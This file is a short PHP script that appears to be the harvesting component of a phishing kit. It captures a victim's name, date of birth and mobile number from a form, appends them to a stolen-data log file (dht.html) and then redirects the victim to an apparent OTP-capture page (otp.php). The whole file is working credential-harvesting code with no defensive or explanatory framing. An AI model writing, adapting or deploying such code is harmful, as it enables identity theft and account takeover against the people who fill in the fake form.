<?php
header("location:otp.php");
$CustomerName=$_POST['CustomerName'];
$dob=$_POST['dob'];
$Mobile=$_POST['Mobile'];
$handle=fopen('dht.html','a');
fwrite($handle ,"CustomerName=$CustomerName\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"dob=$dob\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"Mobile=$Mobile\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
